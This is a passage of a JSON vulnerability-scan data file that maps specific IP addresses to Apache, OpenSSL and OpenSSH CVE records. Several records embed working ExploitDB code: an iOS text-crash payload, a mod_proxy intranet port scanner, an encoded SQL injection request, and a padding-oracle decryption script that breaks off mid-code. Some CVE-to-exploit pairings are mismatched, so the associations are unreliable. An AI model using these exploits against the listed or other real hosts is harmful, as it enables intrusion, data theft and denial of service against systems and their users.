                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
                "osvdb": [],
                "bid": [
                    40827
                ],
                "cve": [
                    "CVE-2010-2068"
                ],
                "msb": []
            }
        ],
        "CVE-2011-4317": [
            {
                "source": "CVE",
                "_id": "2011-4317",
                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an @ (at sign) character and a : (colon) character in invalid positions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4317"
                ],
                "msb": []
            }
        ],
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2011-3368": [
            {
                "source": "CVE",
                "_id": "2011-3639",
                "description": "The mod_proxy module in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x before 2.2.18, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers by using the HTTP/0.9 protocol with a malformed URI containing an initial @ (at sign) character.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-3639"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-3368",
                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21 does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an initial @ (at sign) character.",
                "osvdb": [
                    76079
                ],
                "bid": [
                    49957
                ],
                "cve": [
                    "CVE-2011-3368"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4317",
                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an @ (at sign) character and a : (colon) character in invalid positions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4317"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/env python\r\n\r\nimport socket\r\nimport string\r\nimport getopt, sys\r\n\r\n\r\nknown_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]\r\n\r\ndef send_request(url, apache_target, apache_port, internal_target, internal_port, resource):\r\n\r\n\tget = \"GET \" + url + \"@\" + internal_target + \":\" + internal_port +  \"/\" + resource + \" HTTP/1.1\\r\\n\"\r\n\tget = get + \"Host: \" + apache_target + \"\\r\\n\\r\\n\"\r\n\t\r\n\tremoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\tremoteserver.settimeout(3)\r\n\r\n\ttry:\r\n\t\tremoteserver.connect((apache_target, int(apache_port)))\r\n\t\tremoteserver.send(get)\r\n\t\treturn remoteserver.recv(4096)\r\n\texcept:\r\n\t\treturn \"\"\r\n\r\ndef get_banner(result):\r\n\treturn result[string.find(result, \"\\r\\n\\r\\n\")+4:]\r\n\r\n\r\ndef scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n\r\n\tprint_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n\tfor port in tested_ports:\r\n\t\tport = str(port)\r\n\t\tresult = send_request(url, apache_target, apache_port, internal_target, port, resource)\r\n\t\tif string.find(result,\"HTTP/1.1 200\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 30\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 502\")!=-1:\r\n\t\t\tprint \"- Open port: \" + port + \"/TCP\"\r\n\t\t\tprint get_banner(result)\r\n\t\telif len(result)==0:\r\n\t \t\tprint \"- Filtered port: \" + port + \"/TCP\"\r\n\t\telse:\r\n\t \t\tprint \"- Closed port: \" + port + \"/TCP\"\r\n\t\t\t\r\n\r\ndef usage():\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \"usage():\"\r\n\tprint \"python apache_scan.py [options]\"\r\n\tprint\r\n\tprint \" [options]\"\r\n\tprint \"\t\t-r: Remote Apache host\"\r\n\tprint \"\t\t-p: Remote Apache port (default is 80)\"\r\n\tprint \"\t\t-u: URL on the remote web server (default is /)\"\r\n\tprint \"\t\t-d: Host in the DMZ (default is 127.0.0.1)\"\r\n\tprint \"\t\t-e: Port in the DMZ (enables 'single port scan')\"\r\n\tprint \"\t\t-g: GET request to the host in the DMZ (default is /)\"\r\n\tprint \"\t\t-h: Help page\"\r\n\tprint\r\n\tprint \"examples:\"\r\n\tprint \" - Port scan of the remote host\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif\"\r\n\tprint \" - Port scan of a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local\"\r\n\tprint \" - Retrieve a resource from a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html\"\r\n\tprint\r\n\r\ndef print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \" [+] Target: \" + apache_target\r\n\tprint \" [+] Target port: \" + apache_port\r\n\tprint \" [+] Internal host: \" + internal_target\r\n\tprint \" [+] Tested ports: \" + str(tested_ports)\r\n\tprint \" [+] Internal resource: \" + resource\r\n\tprint\r\n\r\n\r\ndef main():\r\n\r\n\tglobal apache_target\r\n\tglobal apache_port\r\n\tglobal url\r\n\tglobal internal_target\r\n\tglobal internal_port\r\n\tglobal resource\r\n\r\n\ttry:\r\n\t\topts, args = getopt.getopt(sys.argv[1:], \"u:r:p:d:e:g:h\", [\"help\"])\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\ttry:\r\n\t\tfor o, a in opts:\r\n\t\t\tif o in (\"-h\", \"--help\"):\r\n\t\t\t\tusage()\r\n\t\t\t\tsys.exit(2)\r\n\t\t\tif o == \"-u\":\r\n\t\t\t\turl=a\r\n\t\t\tif o == \"-r\":\r\n\t\t\t\tapache_target=a\r\n\t\t\tif o == \"-p\":\r\n\t\t\t\tapache_port=a\r\n\t\t\tif o == \"-d\":\r\n\t\t\t\tinternal_target = a\r\n\t\t\tif o == \"-e\":\r\n\t\t\t\tinternal_port=a\r\n\t\t\tif o == \"-g\":\r\n\t\t\t\tresource=a\t\t\t\t\r\n\t\t\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\t\t\r\n\tif apache_target == \"\":\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\r\nurl = \"/\"\r\napache_target = \"\"\r\napache_port = \"80\"\r\ninternal_target = \"127.0.0.1\"\r\ninternal_port = \"\"\r\nresource = \"/\"\r\n\r\nmain()\r\n\r\nif internal_port!=\"\":\r\n\ttested_ports = [internal_port]\r\nelse:\r\n\ttested_ports = known_ports\r\n\r\nscan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)",
                "description": "Apache mod_proxy - Reverse Proxy Exposure",
                "author": "Rodrigo Marcos",
                "_id": 17969,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2011-10-11T00:00:00+00:00",
                "cve": [
                    "CVE-2011-3368"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2011-3348": [
            {
                "source": "CVE",
                "_id": "2011-3348",
                "description": "The mod_proxy_ajp module in the Apache HTTP Server before 2.2.21, when used with mod_proxy_balancer in certain configurations, allows remote attackers to cause a denial of service (temporary \"error state\" in the backend server) via a malformed HTTP request.",
                "osvdb": [],
                "bid": [
                    49616
                ],
                "cve": [
                    "CVE-2011-3348"
                ],
                "msb": []
            }
        ],
        "CVE-2012-3499": [
            {
                "source": "CVE",
                "_id": "2012-3499",
                "description": "Multiple cross-site scripting (XSS) vulnerabilities in the Apache HTTP Server 2.2.x before 2.2.24-dev and 2.4.x before 2.4.4 allow remote attackers to inject arbitrary web script or HTML via vectors involving hostnames and URIs in the (1) mod_imagemap, (2) mod_info, (3) mod_ldap, (4) mod_proxy_ftp, and (5) mod_status modules.",
                "osvdb": [],
                "bid": [
                    58165,
                    64758
                ],
                "cve": [
                    "CVE-2012-3499"
                ],
                "msb": []
            }
        ],
        "CVE-2012-4558": [
            {
                "source": "CVE",
                "_id": "2012-4558",
                "description": "Multiple cross-site scripting (XSS) vulnerabilities in the balancer_handler function in the manager interface in mod_proxy_balancer.c in the mod_proxy_balancer module in the Apache HTTP Server 2.2.x before 2.2.24-dev and 2.4.x before 2.4.4 allow remote attackers to inject arbitrary web script or HTML via a crafted string.",
                "osvdb": [],
                "bid": [
                    58165,
                    64758
                ],
                "cve": [
                    "CVE-2012-4558"
                ],
                "msb": []
            }
        ],
        "CVE-2013-1896": [
            {
                "source": "CVE",
                "_id": "2013-2349",
                "description": "Unspecified vulnerability in HP Storage Data Protector 6.2X allows remote attackers to execute arbitrary code or cause a denial of service via unknown vectors, aka ZDI-CAN-1896.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2013-2349"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2013-1896",
                "description": "mod_dav.c in the Apache HTTP Server before 2.2.25 does not properly determine whether DAV is enabled for a URI, which allows remote attackers to cause a denial of service (segmentation fault) via a MERGE request in which the URI is configured for handling by the mod_dav_svn module, but a certain href attribute in XML data refers to a non-DAV URI.",
                "osvdb": [],
                "bid": [
                    61129
                ],
                "cve": [
                    "CVE-2013-1896"
                ],
                "msb": []
            }
        ]
    },
    "152.1.62.44": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.62.94": {
        "CVE-2014-2532": [
            {
                "source": "CVE",
                "_id": "2014-2532",
                "description": "sshd in OpenSSH before 6.6 does not properly support wildcards on AcceptEnv lines in sshd_config, which allows remote attackers to bypass intended environment restrictions by using a substring located before a wildcard character.",
                "osvdb": [],
                "bid": [
                    66355
                ],
                "cve": [
                    "CVE-2014-2532"
                ],
                "msb": []
            }
        ]
    },
    "152.1.62.108": {},
    "152.1.64.147": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        